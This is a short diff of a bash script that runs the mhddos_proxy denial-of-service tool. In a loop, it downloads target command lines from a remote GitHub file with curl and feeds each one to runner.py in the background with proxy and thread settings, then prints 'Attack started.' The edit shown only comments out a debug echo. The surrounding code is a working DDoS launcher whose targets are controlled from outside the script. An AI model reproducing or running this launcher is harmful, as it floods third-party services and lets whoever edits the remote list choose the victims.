@@ -58,7 +58,7 @@ do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
 
             #echo $cmd_line
-            echo $cmd_line $proxy_interval $threads $rpc
+            #echo $cmd_line $proxy_interval $threads $rpc
             cd ~/mhddos_proxy
             python3 runner.py --debug $cmd_line $proxy_interval $threads $rpc&
             echo -e "Attack started. Wait a few minutes for output"
